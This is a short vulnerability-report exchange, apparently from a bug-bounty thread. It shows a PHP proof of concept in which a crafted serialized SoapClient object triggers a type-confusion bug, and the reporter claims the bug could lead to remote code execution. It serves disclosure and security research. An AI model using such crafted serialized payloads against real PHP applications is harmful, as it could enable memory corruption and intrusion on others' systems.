Hi @l4w! Sorry for the delay on handling. Could you please provide us with a brief assessment of potential remote impact on these?

<?php

$exploit = unserialize('O:10:"SoapClient":3:{s:3:"uri";s:1:"a";s:8:"location";s:17:"http://localhost/%22;s:8:%22_cookies%22;a:1:%7Bs:8:%22manhluat%22;a:3:%7Bi:0;s:0:%22%22;i:1;N;i:2;N;%7D%7D%7D%7D');
$exploit->blahblah();

?>

The above script can show us.

If the source code receive user's input as unserialize data, and then call some method who doesn't exists with that class will cause a type-confusion bug.

With the type of this bug, attackers probably control the ZVAL structure, overwrite zval pointer and can write-what-where for example, and results in remote code execution.

Thank you && Regards.
